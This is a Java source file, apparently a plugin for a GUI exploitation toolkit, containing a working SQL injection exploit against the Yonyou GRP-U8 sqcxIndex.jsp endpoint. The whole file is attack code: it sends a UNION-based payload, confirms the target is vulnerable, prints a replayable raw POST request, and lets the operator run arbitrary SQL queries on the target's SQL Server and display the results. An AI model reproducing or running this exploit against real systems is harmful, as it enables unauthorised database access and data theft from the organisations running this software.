package exp.oa.yongyou.grp;

import com.alibaba.fastjson.JSON;
import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.getIndexOf;

import java.util.HashMap;

public class yongyou_grpu8_sqcxIndex_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {

        return attcmd(url,cmd, textArea, textArea_cmd);
    }
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            String var = sqcxIndex(url,"user_name()");
            String content = getIndexOf.getHTMLStr(var,"<td id=\"alltd\"  width=\"65%\">");
            if (content!=null) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ yongyou_grpu8_sqcxIndex_sqli ]");
                    textArea.appendText("\n 利用CMD进行利用,注入类型联合注入,数据库:sqlserver");
                    textArea.appendText("\n eg: user_name()");
                    textArea.appendText("\n");
                });

                String target_req = "POST /u8qx/sqcxIndex.jsp HTTP/1.1\n" +
                        "Host: "+ url.substring(url.indexOf("://")+3)+"\n" +
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0\n" +
                        "Content-Length: 54\n" +
                        "Accept: */*\n" +
                        "Connection: close\n" +
                        "Content-Type: application/x-www-form-urlencoded\n" +
                        "Accept-Encoding: gzip, deflate\n" +
                        "\n" +
                        "11=11&key=2%25')+union+select+@@version,user_name()--+";
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n 可抓包进行利用:\n"+target_req+
                            "\n----------------------------------------------------------------------\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    public static String sqcxIndex(String url, String sql){
        try {
            HashMap head = new HashMap();
            String var = "11=11&key=2%25')+union+select+@@version,"+sql+"--+";
            Response res = HttpTools.post(url+"/u8qx/sqcxIndex.jsp",var,head,"utf-8");
            if(res.getCode()==200 && res.getText().contains("alltd")){
                return res.getText();
            }
        }catch (Exception e){
            return null;
        }
        return null;
    }

    private Boolean attcmd(String url,String sql, TextArea textArea, TextArea textArea_cmd) {
        try {
            String var = sqcxIndex(url,sql);
            String content1 = getIndexOf.getHTMLStr(var,"<td id=\"alltd\"  width=\"20%\">");
            String content2 = getIndexOf.getHTMLStr(var,"<td id=\"alltd\"  width=\"65%\">");
            if (content1!=null && content2!=null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n SQL语句: "+sql+" 执行成功");
                    textArea_cmd.appendText("数据库版本:\n"+content1 +"\n----------------------------------------------------------------------\n");
                    textArea_cmd.appendText(content2 +"\n");
                    textArea.appendText("\n");
                });

                return true;
            }else {
                Platform.runLater(() -> {
                    textArea.appendText("\n SQL语句: "+sql+" 执行失败");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
